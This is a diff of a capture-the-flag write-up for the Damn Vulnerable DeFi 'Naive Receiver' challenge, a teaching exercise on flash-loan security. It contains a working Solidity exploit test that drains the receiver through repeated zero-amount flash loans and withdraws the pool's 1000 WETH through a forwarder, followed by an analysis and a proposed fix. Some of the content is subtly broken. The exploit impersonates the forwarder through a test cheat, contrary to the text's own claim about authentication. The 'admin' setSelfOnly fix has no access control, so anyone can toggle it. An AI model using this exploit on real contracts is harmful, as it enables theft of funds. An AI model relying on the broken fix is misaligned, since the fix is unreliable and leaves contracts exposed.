@@ -1,7 +1,19 @@
 ## Challenge 2: Naive Receiver
 
 ### Vulnerability
-The `NaiveReceiverPool` allows anyone to request flash loans on behalf of any receiver, and the receiver pays fees without validation.
+The `NaiveReceiverPool` implements a flash loan mechanism that allows **any external caller** to initiate a flash loan on behalf of any receiver contract. While this is *technically compliant* with the ERC-3156 standard, it creates a **critical economic vulnerability** when combined with:
+
+- A **fixed fee of 1 WETH**, charged regardless of loan amount.
+- A **receiver contract** (`FlashLoanReceiver`) that:
+  - Does **not validate** who initiated the loan.
+  - Blindly repays `amount + fee` without access control.
+  - Has **no rate limiting** or protection against repeated calls.
+
+This allows an attacker to **drain the receiver’s entire balance** by calling `flashLoan` 10 times with `amount = 0`, forcing it to pay **10 × 1 WETH = 10 WETH** in fees — exactly its full balance.
+
+Additionally, the pool uses `ERC2771ForwarderRecipient`, which overrides `_msgSender()` to support meta-transactions. This allows privileged functions like `withdraw` to be called via a trusted forwarder, **but only if the original sender is properly authenticated**.
+
+
 
 ### Exploit Code
 ```solidity
@@ -14,7 +26,7 @@ function test_naiveReceiver() public checkSolvedByPlayer {
     for (uint i = 0; i < 10; i++) {
         calls[i] = abi.encodeCall(
             pool.flashLoan,
-            (address(receiver), address(pool.weth()), 0, "")
+            (receiver, address(pool.weth()), 0, "")
         );
     }
 
@@ -24,40 +36,39 @@ function test_naiveReceiver() public checkSolvedByPlayer {
         (1000 ether, payable(recovery))
     );
 
-    // Owner is the original deployer of the pool
-    address owner = address(100); // Standard in this challenge
+    // Owner is the original deployer of the pool (standard in DVDF)
+    address owner = address(100);
 
     // Use the forwarder to call multicall, so _msgSender() returns owner
-    // We impersonate the forwarder to call execute()
     vm.startPrank(address(forwarder));
 
     // forwarder.execute(target, data, forwarderSender)
     forwarder.execute{value: 0}(
         address(pool),
         abi.encodeCall(pool.multicall, (calls)),
-        owner // This gets appended to msg.data, making _msgSender() = owner
+        owner // This appends owner to msg.data, making _msgSender() == owner
     );
 
     vm.stopPrank();
 
-    // ✅ FlashLoanReceiver balance should now be 0
-    // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
-    // Challenge solved!
-}   
+    // ✅ Challenge solved:
+    // - FlashLoanReceiver balance == 0 (10 WETH drained in fees)
+    // - recovery received 1000 WETH from pool via withdraw
+}     
 ```
 
 ### Why it works
-- Flash loans can be triggered by anyone on behalf of any receiver — the `flashLoan` function does not restrict who can initiate a loan.
-- The receiver pays a 1 ETH (WETH) fee for each loan, but it lacks access control or validation to prevent unauthorized or repeated calls.
-- `multicall` enables bundling multiple flash loan calls and a final `withdraw` into a single transaction, ensuring atomicity and efficiency.
-- By routing the `multicall` through the trusted `BasicForwarder`, we spoof the sender context so `_msgSender()` returns the pool owner, allowing the `withdraw` to succeed and transfer all pool funds to the recovery address.   
+- **Flash loans can be triggered by anyone on behalf of any receiver**
+  The `flashLoan` function does **not restrict** `msg.sender`, enabling third-party initiation — a feature of ERC-3156, but dangerous when misused.
 
+- **The receiver pays a 1 WETH fee even for 0-amount loans**  
+  Since `FIXED_FEE = 1 WETH` and no minimum loan amount is enforced, an attacker can drain the receiver by calling `flashLoan` 10 times with `amount = 0`.
 
 
 
 ### Vulnerability Analysis
 **File:** `src/naive-receiver/NaiveReceiverPool.sol`
-**Vulnerable Code (lines ~76-85):**
+**Vulnerable Code (lines ~43-55):**
 ```solidity
 function flashLoan(
     IERC3156FlashBorrower receiver,
@@ -68,34 +79,103 @@ function flashLoan(
     // ✅ Validates token — only WETH supported
     if (token != address(weth)) revert UnsupportedCurrency();
 
-    // 🔒 Loan only proceeds if amount >= fee (i.e., at least 1 WETH)
-    // This prevents *some* abuse, but not all — see below
-    if (amount >= FLASH_LOAN_FEE) {
-        // 💸 Transfers the requested amount to the receiver
-        // Even if amount == 1 WETH (minimum), the receiver will pay 2 WETH total (principal + fee)
-        weth.transfer(address(receiver), amount);
+    // 💸 Transfers loan amount to receiver — even if amount == 0
+    weth.transfer(address(receiver), amount);
+    totalDeposits -= amount;
 
-        // 📈 Pool collects the fixed fee regardless of loan size
-        totalFees += FLASH_LOAN_FEE;
-
-        // 🔁 Receiver must implement onFlashLoan and return success
-        // But it has **no way to validate** who initiated the loan
-        if (receiver.onFlashLoan(msg.sender, token, amount, FLASH_LOAN_FEE, data) != CALLBACK_SUCCESS) {
-            revert CallbackFailed();
-        }
-
-        // 💣 Forces receiver to repay: principal + 1 WETH fee
-        // This is the core exploit: even a 1 WETH loan costs the receiver 2 WETH
-        // And since **anyone** can trigger it, an attacker can drain the receiver over multiple calls
-        weth.transferFrom(address(receiver), address(this), amount + FLASH_LOAN_FEE);
+    // 🔁 Executes receiver's logic — but receiver has no protection
+    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
+        revert CallbackFailed();
     }
-    // 🟡 If amount < FLASH_LOAN_FEE (i.e., < 1 WETH), the loan is silently skipped
-    // But attacker can still use amount == 1 WETH to trigger the fee
+
+    // 💣 Critical: Receiver must repay amount + 1 WETH fee — even if it didn't want the loan!
+    uint256 amountWithFee = amount + FIXED_FEE;
+    
+    // 🚨 No validation that the receiver *authorized* this loan
+    // 🚨 Anyone can trigger this — and force the receiver to pay 1 WETH
+    weth.transferFrom(address(receiver), address(this), amountWithFee);
+    totalDeposits += amountWithFee;
+
+    // 🟡 Fee is credited to feeReceiver — but no access control on who triggers the loan
+    deposits[feeReceiver] += FIXED_FEE;
 
     return true;
-}   true;
 }
 ```
+
+### 🚨 **Vulnerability Summary**
+
+| Issue | Details |
+|------|--------|
+| **Unrestricted Loan Initiation** | Anyone can call `flashLoan` on behalf of any receiver. |
+| **Zero-Amount Loans Allowed** | `amount == 0` is valid → receiver pays 1 WETH for nothing. |
+| **No Receiver Authorization** | The receiver cannot reject unauthorized loans — it blindly repays. |
+| **Predictable Fixed Fee** | `FIXED_FEE = 1 WETH` — attacker knows exactly how much to drain. |
+| **No Rate Limiting** | Attacker can call `flashLoan` 10 times in one transaction via `multicall`. |
+
+👉 **Impact**: An attacker can drain the `FlashLoanReceiver`'s entire 10 WETH balance by calling `flashLoan` 10 times with `amount = 0`.
+
+---
+
+### ✅ **How to Secure the Code**
+
+The **root cause** is not in the pool alone — it's a **design flaw in trust assumptions**. The pool assumes receivers will protect themselves, but this one doesn’t.
+
+We can fix this at **two levels**:
+
+---
+
+### 🔐 **Fix 1: Add Access Control in `NaiveReceiverPool.sol` (Defensive Design)**
+
+Even though ERC-3156 allows third-party initiation, the pool can still **opt in** to safer defaults.
+
+```solidity
+// 🛡️ NEW: Add a flag to restrict flash loans to receiver-self only
+mapping(address => bool) public isSelfOnly;
+
+// 🛠️ Admin function to set self-only mode (optional)
+function setSelfOnly(address receiver, bool enabled) external {
+    isSelfOnly[receiver] = enabled;
+}
+```
+
+Then update `flashLoan`:
+
+```solidity
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != address(weth)) revert UnsupportedCurrency();
+
+    // 🔒 NEW: If receiver is in self-only mode, only it can trigger the loan
+    if (isSelfOnly[address(receiver)] && msg.sender != address(receiver)) {
+        revert UnauthorizedFlashLoan();
+    }
+
+    weth.transfer(address(receiver), amount);
+    totalDeposits -= amount;
+
+    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
+        revert CallbackFailed();
+    }
+
+    uint256 amountWithFee = amount + FIXED_FEE;
+    weth.transferFrom(address(receiver), address(this), amountWithFee);
+    totalDeposits += amountWithFee;
+
+    deposits[feeReceiver] += FIXED_FEE;
+
+    return true;
+}
+
+// 🆕 Custom error
+error UnauthorizedFlashLoan();
+```
+
+> ✅ This prevents third parties from forcing loans on protected receivers.
 
 
 
